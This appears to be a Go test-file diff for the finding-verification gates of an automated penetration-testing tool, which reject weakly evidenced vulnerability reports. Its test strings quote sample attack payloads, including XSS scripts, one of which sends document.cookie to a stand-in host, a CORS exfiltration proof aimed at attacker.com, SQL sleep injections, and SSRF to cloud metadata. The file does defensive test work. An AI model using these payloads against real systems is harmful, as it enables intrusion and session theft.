@@ -120,6 +120,662 @@ func TestCheckFalsePositive_OpenRedirectWithoutChain(t *testing.T) {
 	}
 }
 
+func TestCheckFalsePositive_XSSReflectionOnly(t *testing.T) {
+	tests := []struct {
+		name       string
+		title      string
+		desc       string
+		severity   string
+		proof      string
+		wantReject bool
+	}{
+		// Reflection-only proof (payload echoed, no execution) → rejected at medium+.
+		{
+			"reflected payload only",
+			"Reflected XSS in search parameter",
+			"The q parameter is reflected in the response",
+			"medium",
+			"curl shows the payload reflected: <script>alert(1)</script> appears in the HTML body",
+			true,
+		},
+		{
+			"img onerror reflection only",
+			"Reflected XSS",
+			"Payload reflected in page",
+			"high",
+			"Response contained <img src=x onerror=alert(1)> in the body",
+			true,
+		},
+		// Encoded reflection → output encoding works → rejected.
+		{
+			"encoded reflection",
+			"Reflected XSS in name field",
+			"name field reflects input",
+			"medium",
+			"The response shows &lt;script&gt;alert(1)&lt;/script&gt; in the page",
+			true,
+		},
+		// Real execution proof → NOT rejected.
+		{
+			"execution via document.domain",
+			"Reflected XSS in search",
+			"q parameter executes",
+			"medium",
+			"browser_action execute_js confirmed alert(document.domain) fired showing the target origin in a dialog",
+			false,
+		},
+		// Stored XSS with out-of-band callback → NOT rejected.
+		{
+			"stored xss with callback",
+			"Stored XSS in support ticket",
+			"Ticket description stored unsanitized",
+			"high",
+			"XSS Hunter callback received with admin session cookie when agent viewed the ticket; payload <script src=...></script> fired in admin panel",
+			false,
+		},
+		// document.cookie execution proof → NOT rejected.
+		{
+			"document.cookie exfil proof",
+			"Stored XSS in profile",
+			"profile bio stored unsanitized",
+			"high",
+			"Payload <script>new Image().src='//x/?c='+document.cookie</script> fired and exfiltrated the session cookie",
+			false,
+		},
+		// Low/info severity → gate does not apply.
+		{
+			"reflection only but info severity",
+			"Reflected input in search",
+			"q parameter reflected",
+			"info",
+			"payload <script>alert(1)</script> reflected",
+			false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
+			gotReject := result != ""
+			if gotReject != tt.wantReject {
+				t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v (msg=%s)",
+					tt.title, tt.severity, tt.wantReject, gotReject, result)
+			}
+		})
+	}
+}
+
+func TestCheckFalsePositive_S3CloudFrontTakeover(t *testing.T) {
+	tests := []struct {
+		name       string
+		title      string
+		desc       string
+		severity   string
+		proof      string
+		wantReject bool
+	}{
+		// The reported false positive: CloudFront origin returns NoSuchKey (bucket exists).
+		{
+			"cloudfront NoSuchKey is not takeover",
+			"S3 Bucket Subdomain Takeover via CloudFront Distribution",
+			"mta-sts subdomain CNAMEs to a CloudFront distribution with a dangling S3 origin",
+			"critical",
+			"dig CNAME shows d1uhex0.cloudfront.net; curl of the distribution returns <Code>NoSuchKey</Code> for key email.example.com/",
+			true,
+		},
+		// CloudFront-fronted, only global-namespace NoSuchBucket, no claim → rejected.
+		{
+			"cloudfront NoSuchBucket without claim proof",
+			"Subdomain Takeover via dangling CloudFront S3 origin",
+			"CNAME to cloudfront.net, bucket does not exist",
+			"high",
+			"curl https://bucket.s3.amazonaws.com returns <Code>NoSuchBucket</Code>; the CloudFront origin is dangling",
+			true,
+		},
+		// Genuine, claimed S3 takeover with canary → accepted.
+		{
+			"claimed s3 takeover with canary",
+			"Subdomain Takeover of assets.example.com via dangling S3 website endpoint",
+			"CNAME points directly to bucket.s3-website-us-east-1.amazonaws.com returning NoSuchBucket",
+			"high",
+			"Created the bucket and uploaded a benign canary; my content is now served over https://assets.example.com confirming takeover",
+			false,
+		},
+		// Non-S3 takeover (GitHub Pages) is not touched by this gate.
+		{
+			"github pages takeover untouched",
+			"Subdomain Takeover via GitHub Pages",
+			"docs.example.com CNAMEs to org.github.io which is unclaimed",
+			"high",
+			"Response: There isn't a GitHub Pages site here. Claimed the repo and served a canary at docs.example.com",
+			false,
+		},
+		// Info severity → gate does not apply.
+		{
+			"cloudfront nosuchkey but info severity",
+			"Possible subdomain takeover via CloudFront",
+			"mta-sts subdomain, NoSuchKey from distribution",
+			"info",
+			"NoSuchKey returned",
+			false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
+			gotReject := result != ""
+			if gotReject != tt.wantReject {
+				t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v (msg=%s)",
+					tt.title, tt.severity, tt.wantReject, gotReject, result)
+			}
+		})
+	}
+}
+
+func TestCheckFalsePositive_TimeBasedSQLi(t *testing.T) {
+	tests := []struct {
+		name       string
+		title      string
+		desc       string
+		severity   string
+		proof      string
+		wantReject bool
+	}{
+		// Single SLEEP measurement, no baseline → rejected.
+		{
+			"single sleep measurement",
+			"Time-based blind SQL injection in id parameter",
+			"The id parameter is injectable",
+			"high",
+			"Sent ' AND SLEEP(5)-- and the response took 5.2 seconds, confirming time-based blind SQLi.",
+			true,
+		},
+		// Single SLEEP(10) — a lone high sleep value is still single-shot → rejected.
+		{
+			"single sleep10 measurement",
+			"Time-based blind SQL injection",
+			"id parameter injectable",
+			"high",
+			"Sent ' AND SLEEP(10)-- and the response took 10 seconds.",
+			true,
+		},
+		// Differential timing with baseline → accepted.
+		{
+			"differential timing accepted",
+			"Time-based blind SQL injection",
+			"id parameter injectable",
+			"high",
+			"baseline 0.2s; SLEEP(0) 0.3s; SLEEP(5) 5.3s; SLEEP(10) 10.4s; repeated 3x, delay scales with sleep value",
+			false,
+		},
+		// Hard confirmation (data extraction) → accepted even with timing words.
+		{
+			"data extraction accepted",
+			"SQL injection in login",
+			"union-based SQLi",
+			"high",
+			"sqlmap dumped users table via UNION SELECT from information_schema; response time noted",
+			false,
+		},
+		// Error-based confirmation → accepted.
+		{
+			"error based accepted",
+			"SQL injection in search",
+			"error-based SQLi",
+			"high",
+			"Injecting a single quote returned: You have an error in your SQL syntax near '''",
+			false,
+		},
+		// Info severity → gate does not apply.
+		{
+			"single sleep but info",
+			"Possible time-based SQLi",
+			"id parameter",
+			"info",
+			"' AND SLEEP(5)-- took 5 seconds",
+			false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
+			gotReject := result != ""
+			if gotReject != tt.wantReject {
+				t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v (msg=%s)",
+					tt.title, tt.severity, tt.wantReject, gotReject, result)
+			}
+		})
+	}
+}
+
+func TestCheckFalsePositive_SSLScoping(t *testing.T) {
+	// Config noise → still rejected.
+	rejects := []string{
+		"Weak SSL Cipher Suite",
+		"TLS 1.0 Enabled",
+		"Expired Certificate",
+		"POODLE Vulnerability",
+		"Self-signed certificate in use",
+	}
+	for _, title := range rejects {
+		if checkFalsePositive(title, "", "medium", "") == "" {
+			t.Errorf("title=%q: expected SSL/TLS config noise to be rejected", title)
+		}
+	}
+
+	// Genuine TLS exploit mentioning "TLS"/"certificate" → NOT auto-rejected by this gate.
+	keep := []struct{ title, desc, proof string }{
+		{"Certificate validation bypass enables MITM", "App accepts any TLS certificate, allowing interception", "Presented a self-issued cert; app connected and leaked the bearer token"},
+		{"mTLS client authentication bypass", "Mutual TLS auth can be bypassed by omitting the client cert", "Reached the protected admin API without a client certificate"},
+	}
+	for _, k := range keep {
+		if r := checkFalsePositive(k.title, k.desc, "high", k.proof); r != "" {
+			t.Errorf("title=%q: genuine TLS exploit should NOT be rejected by SSL gate, got: %s", k.title, r)
+		}
+	}
+}
+
+func TestCheckFalsePositive_CORSAliases(t *testing.T) {
+	// Alternate phrasing without the literal "cors" should still be gated.
+	result := checkFalsePositive(
+		"Access-Control-Allow-Origin reflects arbitrary origin",
+		"ACAO header reflects any Origin with credentials enabled",
+		"high",
+		"curl with Origin: https://evil.com is reflected in Access-Control-Allow-Origin",
+	)
+	if result == "" {
+		t.Error("CORS finding phrased via ACAO (no 'cors' literal) should still be rejected without theft proof")
+	}
+
+	// With credential-theft proof → accepted.
+	result = checkFalsePositive(
+		"Access-Control-Allow-Origin misconfiguration",
+		"ACAO reflects origin with credentials",
+		"high",
+		"PoC fetch() with credentials exfiltrates the session cookie cross-origin to attacker.com",
+	)
+	if result != "" {
+		t.Errorf("ACAO with credential-theft PoC should NOT be rejected, got: %s", result)
+	}
+}
+
+func TestCheckFalsePositive_MethodEnforcementBypass(t *testing.T) {
+	tests := []struct {
+		name       string
+		title      string
+		desc       string
+		severity   string
+		proof      string
+		wantReject bool
+	}{
+		// The reported false positive: status-codes-only "method bypass".
+		{
+			"status-codes-only method bypass",
+			"Broken Access Control on /auth Endpoint - Method Enforcement Bypass",
+			"The /auth endpoint only enforces auth for GET; POST, PUT, PATCH, DELETE, OPTIONS, HEAD return 200 without credentials.",
+			"high",
+			"GET /auth: 401 (blocked); POST /auth: 200 (VULNERABLE); PUT 200; PATCH 200; DELETE 200; OPTIONS 200; HEAD 200",
+			true,
+		},
+		// Same but with proven state change → accepted.
+		{
+			"method bypass with state change",
+			"Broken Access Control - unauthenticated DELETE",
+			"DELETE on /api/users/123 works without auth",
+			"high",
+			"Unauthenticated DELETE /api/users/123 returned 200 and the user record was deleted; re-fetch returns 404",
+			false,
+		},
+		// Method-based finding where data was returned → accepted.
+		{
+			"method bypass returning data",
+			"Access control bypass via POST method",
+			"POST returns data that GET blocks",
+			"high",
+			"POST /account returned another user's PII in the JSON body: email victim@example.com, balance $4,200",
+			false,
+		},
+		// Info severity → gate does not apply.
+		{
+			"method bypass info severity",
+			"Method enforcement inconsistency on /auth",
+			"non-GET methods return 200",
+			"info",
+			"POST 200, PUT 200, empty body",
+			false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
+			gotReject := result != ""
+			if gotReject != tt.wantReject {
+				t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v (msg=%s)",
+					tt.title, tt.severity, tt.wantReject, gotReject, result)
+			}
+		})
+	}
+}
+
+func TestCheckFalsePositive_ClientSideSSRF(t *testing.T) {
+	tests := []struct {
+		name       string
+		title      string
+		desc       string
+		severity   string
+		proof      string
+		wantReject bool
+	}{
+		// The reported false positive: client-side URL-param handling labeled SSRF.
+		{
+			"client-side mislabeled as ssrf",
+			"Server-Side Request Forgery (SSRF) via graphqlUrl Parameter - Token Theft",
+			"The embeddable dashboard processes URL parameters client-side in dashboards.bundle.js and uses graphqlUrl to configure requests from the browser.",
+			"critical",
+			"From bundle.js: window.location.search is parsed; the browser sends a Bearer token to the attacker-supplied graphqlUrl. Attacker captures the token they put in the URL.",
+			true,
+		},
+		// Genuine SSRF with out-of-band callback → accepted.
+		{
+			"real ssrf with callback",
+			"SSRF in webhook URL parameter",
+			"The server fetches a user-supplied URL",
+			"high",
+			"Set param to http://interact.sh subdomain; callback received at the collaborator server from the target's IP, confirming server-side request.",
+			false,
+		},
+		// Genuine SSRF reaching cloud metadata → accepted.
+		{
+			"real ssrf metadata",
+			"SSRF to cloud metadata",
+			"server-side fetch of attacker URL",
+			"high",
+			"Param set to http://169.254.169.254/latest/meta-data/ returned the IAM role credentials in the response body",
+			false,
+		},
+		// Info severity → gate does not apply.
+		{
+			"client-side ssrf info",
+			"Possible SSRF via url parameter",
+			"browser reads url param",
+			"info",
+			"client-side fetch from window.location",
+			false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
+			gotReject := result != ""
+			if gotReject != tt.wantReject {
+				t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v (msg=%s)",
+					tt.title, tt.severity, tt.wantReject, gotReject, result)
+			}
+		})
+	}
+}
+
+func TestReportVuln_IndependentVerifierGate(t *testing.T) {
+	base := func() map[string]string {
+		m := validReportArgs()
+		return m
+	}
+
+	t.Run("confirmed persists and marks verified", func(t *testing.T) {
+		ctx := "verifier-confirm"
+		CleanupContext(ctx)
+		defer CleanupContext(ctx)
+		SetFindingVerifier(ctx, func(VerificationRequest) VerificationVerdict {
+			return VerificationVerdict{Confirmed: true, Reason: "reproduced", Evidence: "dumped rows again"}
+		})
+
+		res, err := reportVulnWithContextID(ctx, base())
+		if err != nil {
+			t.Fatalf("report error: %v", err)
+		}
+		if _, ok := res.Metadata["vuln_id"]; !ok {
+			t.Fatalf("expected vuln stored, got: %s", res.Output)
+		}
+		vulns := GetVulnerabilitiesForContext(ctx)
+		if len(vulns) != 1 || !vulns[0].Verified {
+			t.Fatalf("expected 1 verified vuln, got %d (verified=%v)", len(vulns), len(vulns) == 1 && vulns[0].Verified)
+		}
+	})
+
+	t.Run("rejected drops the finding", func(t *testing.T) {
+		ctx := "verifier-reject"
+		CleanupContext(ctx)
+		defer CleanupContext(ctx)
+		SetFindingVerifier(ctx, func(VerificationRequest) VerificationVerdict {
+			return VerificationVerdict{Confirmed: false, Reason: "could not reproduce — by design"}
+		})
+
+		res, err := reportVulnWithContextID(ctx, base())
+		if err != nil {
+			t.Fatalf("report error: %v", err)
+		}
+		if !strings.Contains(res.Output, "REJECTED by independent verifier") {
+			t.Fatalf("expected verifier rejection, got: %s", res.Output)
+		}
+		if got := len(GetVulnerabilitiesForContext(ctx)); got != 0 {
+			t.Fatalf("expected 0 vulns after verifier rejection, got %d", got)
+		}
+	})
+
+	t.Run("inconclusive persists as unverified", func(t *testing.T) {
+		ctx := "verifier-inconclusive"
+		CleanupContext(ctx)
+		defer CleanupContext(ctx)
+		SetFindingVerifier(ctx, func(VerificationRequest) VerificationVerdict {
+			return VerificationVerdict{Inconclusive: true, Reason: "verifier LLM error"}
+		})
+
+		res, err := reportVulnWithContextID(ctx, base())
+		if err != nil {
+			t.Fatalf("report error: %v", err)
+		}
+		vulns := GetVulnerabilitiesForContext(ctx)
+		if len(vulns) != 1 {
+			t.Fatalf("expected 1 vuln stored on inconclusive, got %d (%s)", len(vulns), res.Output)
+		}
+		if vulns[0].Verified {
+			t.Fatalf("inconclusive finding must NOT be marked Verified")
+		}
+		if !strings.Contains(res.Output, "INCONCLUSIVE") {
+			t.Fatalf("expected inconclusive notice, got: %s", res.Output)
+		}
+	})
+
+	t.Run("no verifier falls back to heuristic verified flag", func(t *testing.T) {
+		ctx := "verifier-absent"
+		CleanupContext(ctx) // ensure no verifier registered for this context
+		defer CleanupContext(ctx)
+
+		res, err := reportVulnWithContextID(ctx, base())
+		if err != nil {
+			t.Fatalf("report error: %v", err)
+		}
+		vulns := GetVulnerabilitiesForContext(ctx)
+		if len(vulns) != 1 || !vulns[0].Verified {
+			t.Fatalf("expected 1 vuln verified by heuristic fallback, got %d (%s)", len(vulns), res.Output)
+		}
+	})
+}
+
+func TestCheckClaimConsistency(t *testing.T) {
+	tests := []struct {
+		name       string
+		title      string
+		cwe        string
+		method     string
+		vector     string
+		severity   string
+		proof      string
+		wantReject bool
+	}{
+		// SSRF + 'reflected' method with NO hard evidence → reject (check #1).
+		{
+			"ssrf reflected no evidence",
+			"SSRF via parameter", "CWE-918", "reflected", "",
+			"high", "the parameter value appears in the response", true,
+		},
+		// SSRF with OOB callback → accepted (callback_received, not reflected).
+		{
+			"ssrf with callback",
+			"SSRF in webhook", "CWE-918", "callback_received", "",
+			"high", "interact.sh callback received from the target server", false,
+		},
+		// SSRF labeled reflected BUT proof shows internal access → not dropped (real finding).
+		{
+			"ssrf reflected but internal hit",
+			"SSRF in url param", "CWE-918", "reflected", "",
+			"high", "the server connected to internal host 10.0.0.5 and returned the admin panel", false,
+		},
+		// 'reflected' method for a hard class (CWE-89) → reject.
+		{
+			"reflected method for sqli",
+			"SQL Injection", "CWE-89", "reflected", "",
+			"high", "the input is reflected in the response", true,
+		},
+		// CVSS I:H without state change → reject.
+		{
+			"integrity high no state change",
+			"Broken access control", "CWE-284", "manual_verified",
+			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+			"high", "POST returned 200 with empty body", true,
+		},
+		// CVSS C:H without data obtained → reject.
+		{
+			"confidentiality high no data",
+			"Information exposure", "CWE-200", "manual_verified",
+			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+			"high", "the endpoint returned a 200 response", true,
+		},
+		// CVSS C:H WITH extracted data → accepted.
+		{
+			"confidentiality high with data",
+			"SQL injection", "CWE-89", "data_extracted",
+			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+			"high", "dumped users table via union select from information_schema", false,
+		},
+		// Info severity → gate does not apply.
+		{
+			"info severity skipped",
+			"SSRF maybe", "CWE-918", "reflected", "",
+			"info", "browser fetch", false,
+		},
+		// SQLi "proven" only via RCE evidence, no native SQLi proof → reject (provenance).
+		{
+			"sqli proven by rce only",
+			"SQL Injection in /search", "CWE-89", "exploited", "",
+			"high", "dumped the database using the eval() RCE; rows: admin1:pass1, admin2:pass2", true,
+		},
+		// SQLi proven natively (sqlmap/union) → accept.
+		{
+			"sqli proven natively",
+			"SQL Injection in /search", "CWE-89", "data_extracted", "",
+			"high", "sqlmap confirmed union select from information_schema, dumped users table", false,
+		},
+		// Real SQLi-to-RCE chain (native proof present) → accept.
+		{
+			"sqli to rce chain",
+			"SQL Injection escalated to RCE", "CWE-89", "data_extracted", "",
+			"high", "confirmed boolean-based SQLi via ' OR 1=1, then used INTO OUTFILE to gain RCE", false,
+		},
+		// Blind XXE confirmed only by a success message → reject (blind validation).
+		{
+			"blind xxe success only",
+			"XXE Injection in /search", "CWE-611", "exploited", "",
+			"high", "submitted XML with an external entity; response was 'Search made successfully'", true,
+		},
+		// Blind XXE with OOB callback → accept.
+		{
+			"blind xxe with oob",
+			"XXE Injection in /search", "CWE-611", "callback_received", "",
+			"high", "interact.sh callback received confirming the parser resolved my external entity out-of-band", false,
+		},
+		// In-band XXE returning file content → accept.
+		{
+			"in-band xxe file read",
+			"XXE Injection in /upload", "CWE-611", "exploited", "",
+			"high", "the response echoed back root:x:0:0:root:/root:/bin/bash from /etc/passwd", false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := checkClaimConsistency(tt.title, tt.cwe, tt.method, tt.vector, tt.severity, "", tt.proof)
+			gotReject := got != ""
+			if gotReject != tt.wantReject {
+				t.Errorf("wantReject=%v gotReject=%v (msg=%s)", tt.wantReject, gotReject, got)
+			}
+		})
+	}
+}
+
+func TestCheckFalsePositive_OpenAPISpecExposure(t *testing.T) {
+	tests := []struct {
+		name       string
+		title      string
+		desc       string
+		severity   string
+		proof      string
+		wantReject bool
+	}{
+		// The reported false positive: public OpenAPI spec + field names.
+		{
+			"openapi spec field names",
+			"Unauthenticated Access to OpenAPI Specification Exposes Complete API Documentation",
+			"The OpenAPI spec at /v1/openapi.json is accessible without auth, exposing 80 endpoints and field names like webhook_secret, api_key, stripe_api_key.",
+			"medium",
+			"curl /v1/openapi.json returns 200, 1.7MB; field names webhook_secret, api_key found; endpoints enumerated",
+			true,
+		},
+		// Swagger UI exposure, no secret values → rejected.
+		{
+			"swagger ui exposed",
+			"Swagger UI exposed without authentication",
+			"swagger api documentation reachable",
+			"high",
+			"GET /swagger returns the full API spec with all endpoints documented",
+			true,
+		},
+		// OpenAPI spec that actually embeds a live secret value → accepted.
+		{
+			"openapi with embedded secret value",
+			"OpenAPI spec leaks live Stripe key",
+			"The openapi.json contains a hardcoded secret",
+			"high",
+			"The spec's example contains a live key: sk_live_51Hxample... which authenticates to Stripe",
+			false,
+		},
+		// Info severity → gate does not apply.
+		{
+			"openapi info severity",
+			"OpenAPI spec accessible",
+			"spec at /openapi.json",
+			"info",
+			"200 OK",
+			false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
+			gotReject := result != ""
+			if gotReject != tt.wantReject {
+				t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v (msg=%s)",
+					tt.title, tt.severity, tt.wantReject, gotReject, result)
+			}
+		})
+	}
+}
+
 func TestCheckFalsePositive_CSVInjection(t *testing.T) {
 	result := checkFalsePositive("CSV Injection in Export", "Formula injection in CSV export", "medium", "")
 	if result == "" {
@@ -179,6 +835,75 @@ func TestCheckFalsePositive_ScannerOnly(t *testing.T) {
 	result = checkFalsePositive("Nuclei Detected SQL Injection", "nuclei found SQLi, manually verified", "high", "sqlmap confirmed with --dump")
 	if result != "" {
 		t.Errorf("scanner finding with manual proof should NOT be rejected, got: %s", result)
+	}
+}
+
+func TestPipeline_RealFindingsSurvive(t *testing.T) {
+	// Well-formed REAL findings must pass BOTH deterministic gates untouched.
+	// This is the guard against the new gates suppressing true findings.
+	real := []struct {
+		name     string
+		title    string
+		desc     string
+		cwe      string
+		method   string
+		vector   string
+		severity string
+		proof    string
+	}{
+		{
+			"sqli data extraction",
+			"SQL Injection in /login", "Union-based SQLi in the id parameter", "CWE-89", "data_extracted",
+			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "high",
+			"sqlmap dumped the users table via UNION SELECT from information_schema; extracted 512 rows including password hashes",
+		},
+		{
+			"reflected xss executed",
+			"Reflected XSS in search", "q parameter reflected unencoded", "CWE-79", "exploited",
+			"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N", "medium",
+			"browser_action execute_js confirmed alert(document.domain) fired showing the target origin; screenshot attached",
+		},
+		{
+			"ssrf internal metadata",
+			"SSRF via image url", "Server fetches attacker-controlled URL", "CWE-918", "callback_received",
+			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "critical",
+			"interact.sh callback received from the target; fetched 169.254.169.254/latest/meta-data returning IAM role credentials",
+		},
+		{
+			"idor two accounts",
+			"IDOR in order API", "Can read other users' orders", "CWE-639", "authenticated",
+			"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", "high",
+			"As user B, retrieved user A's order record including PII: another user's email and shipping address",
+		},
+		{
+			"rce command output",
+			"RCE via file upload", "Uploaded a web shell", "CWE-78", "exploited",
+			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "critical",
+			"executed id via the shell; command execution confirmed: uid=33(www-data) gid=33(www-data)",
+		},
+		{
+			"blind stored xss callback",
+			"Stored XSS in support ticket", "Fires in admin panel", "CWE-79", "callback_received",
+			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N", "high",
+			"XSS Hunter callback received with the admin session cookie when an agent viewed the ticket",
+		},
+		{
+			"internal ssrf reflected-mislabel",
+			"SSRF in webhook url", "Server connects to attacker URL", "CWE-918", "reflected",
+			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "high",
+			"the server connected to internal host 10.0.0.5 and the internal admin dashboard HTML was returned",
+		},
+	}
+
+	for _, tt := range real {
+		t.Run(tt.name, func(t *testing.T) {
+			if r := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof); r != "" {
+				t.Errorf("checkFalsePositive rejected a REAL finding %q: %s", tt.title, r)
+			}
+			if r := checkClaimConsistency(tt.title, tt.cwe, tt.method, tt.vector, tt.severity, tt.desc, tt.proof); r != "" {
+				t.Errorf("checkClaimConsistency rejected a REAL finding %q: %s", tt.title, r)
+			}
+		})
 	}
 }
 
@@ -345,6 +1070,37 @@ func min(a, b int) int {
 		return a
 	}
 	return b
+}
+
+// TestHasStrongEvidence_IncidentalTokensAreWeak locks in the tightening: proof
+// made of incidental tokens (status codes, bare "http", emails, "account")
+// must NOT count as strong evidence, while concrete exploitation outcomes do.
+func TestHasStrongEvidence_IncidentalTokensAreWeak(t *testing.T) {
+	weak := []string{
+		"The endpoint responded with a 200 OK status code",
+		"Response: HTTP/1.1 200 OK, see http://example.com/account",
+		"Found an email address user@example.com on the profile page",
+		"The request took 5 seconds to respond",
+		"{ \"status\": \"ok\", \"internal\": true } returned from localhost",
+	}
+	for _, p := range weak {
+		if hasStrongEvidence("high", p, "A potential issue was observed") {
+			t.Errorf("proof %q should NOT count as strong evidence for high", p)
+		}
+	}
+
+	strong := []string{
+		"Dumped users table: id=1 admin@corp.com via UNION SELECT from information_schema",
+		"Command output: uid=0(root) gid=0(root)",
+		"Read /etc/passwd: root:x:0:0:root:/root:/bin/bash",
+		"SSRF callback received at interact.sh; fetched 169.254.169.254/latest/meta-data",
+		"Stolen session via document.cookie exfiltration",
+	}
+	for _, p := range strong {
+		if !hasStrongEvidence("high", p, "") {
+			t.Errorf("proof %q SHOULD count as strong evidence for high", p)
+		}
+	}
 }
 
 // TestPromoteToParentViaSetParentContext verifies that:
